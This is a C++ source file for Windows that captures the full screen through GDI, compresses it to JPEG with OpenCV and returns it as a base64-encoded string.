#include "modules/screen.hpp"
#include "utils/base64.hpp"

#include <windows.h>
#include <vector>
#include <string>
#include <iostream>

#include <opencv2/opencv.hpp>

std::string ScreenCapture::capture_base64()
{
    int width  = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    HDC hScreenDC = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);

    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    SelectObject(hMemoryDC, hBitmap);

    BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);

    BITMAPINFOHEADER bi;
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = width;
    bi.biHeight = -height;
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;

    std::vector<BYTE> buffer(width * height * 3);

    GetDIBits(
        hMemoryDC, 
        hBitmap,
        0,
        height,
        buffer.data(),
        (BITMAPINFO*)&bi,
        DIB_RGB_COLORS
    );

    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);

    cv::Mat img(height, width, CV_8UC3, buffer.data());

    std::vector<uchar> encoded;
    cv::imencode(".jpg", img, encoded, { cv::IMWRITE_JPEG_QUALITY, 80 });

    return base64_encode(encoded.data(), encoded.size());
}
